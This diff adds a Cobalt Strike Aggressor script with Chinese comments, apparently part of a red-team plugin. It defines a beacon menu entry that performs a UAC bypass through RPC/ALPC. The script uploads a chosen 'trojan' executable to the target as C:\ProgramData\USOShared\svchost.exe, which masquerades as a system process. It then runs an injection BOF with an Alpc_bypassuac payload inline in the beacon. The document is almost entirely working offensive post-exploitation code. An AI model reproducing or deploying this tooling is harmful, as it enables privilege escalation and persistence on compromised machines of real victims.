@@ -1,0 +1,84 @@
+popup beacon_bottom {
+		menu "bypassUAC" {
+			item " RpcALPC（牺牲当前beacon）" {
+				$bid = $1['@'];
+				$dialog = dialog("RpcALPC提权", %(PEFile => "",bid => $bid), &RpcALPC);
+				dialog_description($dialog, "RpcALPC提权");
+				drow_file($dialog, "PEFile", "要执行的程序: ");	     
+				dbutton_action($dialog, "Run");
+				dialog_show($dialog);
+			}
+		}
+	}
+
+sub upload_file {
+    # 上传文件到目标机器
+    local('$handle','$data');
+    $handle = openf($3);
+    $data = readb($handle, -1);
+    closef($handle);
+    bupload_raw($1, $2, $data, $3);
+}
+
+sub print_info {
+  # 打印信息
+    local('$msg', 'color');
+    $msg = $2;
+    $color = $3;
+
+    if ($color eq $null){
+        blog($1, $msg);
+    }
+    
+    if ($color eq "w") {
+        blog($1, "\c0". $msg ."\c0");
+    }
+
+    if ($color eq "b") {
+        blog($1, "\c2". $msg ."\c2");
+    }
+
+    if ($color eq "dg") {
+        blog($1, "\c3". $msg ."\c3");
+    }
+
+    if ($color eq "r") {
+        blog($1, "\c4". $msg ."\c4");
+    }
+
+    if ($color eq "dy") {
+        blog($1, "\c7". $msg ."\c7");
+    }
+
+    if ($color eq "y") {
+        blog($1, "\c8". $msg ."\c8");
+    }
+
+    if ($color eq "g") {
+        blog($1, "\c9". $msg ."\c9");
+    }
+
+    if ($color eq "light_blue") {
+        blog($1, "\cB". $msg ."\cB");
+    }
+}
+
+sub RpcALPC {
+    $bid = $3['bid'];
+    $pefile = $3['PEFile'];
+	$barch  = barch($bid);
+	
+	print_info($bid, "[*] 正在上传木马文件...");
+    upload_file($bid, "C:\\ProgramData\\USOShared\\svchost.exe", $pefile);
+	
+    $handle1 = openf(script_resource("./module/inject $+ . $+ $barch $+ .obj"));
+    $data1   = readb($handle1, -1);
+    closef($handle1);
+
+    $handle2 = openf(script_resource("./module/Alpc_bypassuac.bin"));
+    $data2 = readb($handle2, -1);
+    closef($handle2);
+	
+    $args = bof_pack($bid, "b", $data2);
+    beacon_inline_execute($bid, $data1, "go", $args);
+}
